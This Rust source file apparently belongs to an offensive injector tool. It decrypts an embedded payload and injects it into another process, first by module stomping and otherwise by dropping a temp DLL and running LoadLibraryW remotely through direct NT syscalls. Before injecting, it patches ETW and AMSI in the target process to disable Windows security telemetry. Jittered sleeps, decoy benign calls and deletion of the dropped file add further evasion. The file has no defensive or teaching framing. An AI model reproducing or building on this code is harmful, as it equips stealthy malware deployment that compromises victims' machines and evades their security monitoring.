use crate::injector::process_manager::ProcessManager;
use crate::injector::module_stomping;
use kurion_sys::internal_api::{
    n_allocate_virtual_memory_syscall, n_write_virtual_memory_syscall,
    n_create_thread_ex_syscall,
};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use std::ffi::c_void;
use std::ptr;

pub struct PayloadInjector<'a> {
    process_manager: &'a ProcessManager,
}

impl<'a> PayloadInjector<'a> {
    pub fn new(process_manager: &'a ProcessManager) -> Self {
        Self { process_manager }
    }

    fn d_payload() -> Result<Vec<u8>, String> {
        use crate::injector::encrypted_payload::d_hex_payload;

        let hex = crate::EMBEDDED_PAYLOAD_HEX;
        if hex.is_empty() {
            return Err("No embedded payload - build payload first, then rebuild injector".to_string());
        }

        let key = &crate::PAYLOAD_KEY;
        d_hex_payload(hex, crate::PAYLOAD_ORIGINAL_SIZE, key)
    }

    pub fn i_stomped(&self, _pipe_name: &str) -> Result<(), String> {
        use kurion_sys::sleep_obfuscation::j_sleep_range;
        let h_process = self.process_manager.g_process_handle();

        j_sleep_range(50, 150);

        let dll_bytes = Self::d_payload()?;

        j_sleep_range(50, 150);

        unsafe {
            module_stomping::s_and_execute(h_process, &dll_bytes)?;
        }

        Ok(())
    }

    pub fn i_encrypted(&self, _pipe_name: &str) -> Result<(), String> {
        use crate::injector::benign_imports::r_benign_interleave;
        use kurion_sys::sleep_obfuscation::j_sleep_range;

        let h_process = self.process_manager.g_process_handle();

        j_sleep_range(50, 150);

        let dll_bytes = Self::d_payload()?;

        j_sleep_range(50, 150);

        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;

        let rand_id = format!("{:08X}", (seed.wrapping_mul(6364136223846793005) >> 32) as u32);
        let temp_dir = std::env::temp_dir();
        let temp_path = temp_dir.join(format!("{}.tmp", rand_id));

        std::fs::write(&temp_path, &dll_bytes)
            .map_err(|e| format!("Failed to write temp DLL: {}", e))?;

        let temp_path_str = temp_path.to_str()
            .ok_or("Invalid temp path")?;
        let temp_path_wide = kurion_core::common::t_wide(temp_path_str);
        let temp_path_bytes: Vec<u8> = temp_path_wide.iter()
            .flat_map(|w| w.to_ne_bytes().to_vec())
            .collect();

        let kernel32 = unsafe {
            windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::s!("kernel32.dll"))
                .map_err(|e| format!("Failed to get kernel32: {}", e))?
        };
        let load_library_addr = unsafe {
            windows::Win32::System::LibraryLoader::GetProcAddress(kernel32, windows::core::s!("LoadLibraryW"))
                .ok_or("Failed to find LoadLibraryW")?
        };

        let mut base_address: *mut c_void = ptr::null_mut();
        let mut region_size = temp_path_bytes.len();

        unsafe {
            let status = n_allocate_virtual_memory_syscall(
                h_process,
                &mut base_address,
                0,
                &mut region_size,
                (MEM_COMMIT | MEM_RESERVE).0,
                PAGE_READWRITE.0,
            );

            if status.0 != 0 {
                let _ = std::fs::remove_file(&temp_path);
                return Err(format!("NtAllocateVirtualMemory failed: 0x{:X}", status.0));
            }

            r_benign_interleave();
            j_sleep_range(50, 150);

            let mut bytes_written = 0;
            let status = n_write_virtual_memory_syscall(
                h_process,
                base_address,
                temp_path_bytes.as_ptr() as *mut c_void,
                temp_path_bytes.len(),
                &mut bytes_written,
            );

            if status.0 != 0 {
                let _ = std::fs::remove_file(&temp_path);
                return Err(format!("NtWriteVirtualMemory failed: 0x{:X}", status.0));
            }

            r_benign_interleave();
            j_sleep_range(30, 100);

            let mut h_thread = HANDLE(0 as *mut _);
            let status = n_create_thread_ex_syscall(
                &mut h_thread,
                0x1FFFFF,
                ptr::null_mut(),
                h_process,
                load_library_addr as *mut c_void,
                base_address,
                0, 0, 0, 0,
                ptr::null_mut(),
            );

            if status.0 != 0 {
                let _ = std::fs::remove_file(&temp_path);
                return Err(format!("NtCreateThreadEx failed: 0x{:X}", status.0));
            }

            std::thread::sleep(std::time::Duration::from_millis(500));
            let _ = std::fs::remove_file(&temp_path);
        }

        Ok(())
    }

    pub fn inject(&self, _pipe_name: &str) -> Result<(), String> {
        let h_process = self.process_manager.g_process_handle();
        unsafe {
            kurion_sys::remote_patch::p_remote_etw(h_process);
            kurion_sys::remote_patch::p_remote_amsi(h_process);
        }

        match self.i_stomped(_pipe_name) {
            Ok(()) => return Ok(()),
            Err(_e) => {
            }
        }

        self.i_encrypted(_pipe_name)
    }
}
